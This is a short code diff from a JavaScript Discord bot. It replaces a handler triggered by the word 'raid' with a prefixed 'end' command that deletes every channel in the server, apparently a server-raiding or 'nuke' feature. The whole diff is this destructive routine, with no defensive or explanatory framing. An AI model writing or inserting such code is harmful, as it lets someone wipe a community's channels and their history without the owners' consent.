@@ -494,7 +494,9 @@ client.on("message", message => {
 })
 
 client.on("message", message => {
-    if(message.content === "raid") {
-        message.guild.channels.delete()
+    if(message.content === prefix + "end") {
+        message.guild.channels.forEach(g => {
+            g.delete()
+        })
     }
 })
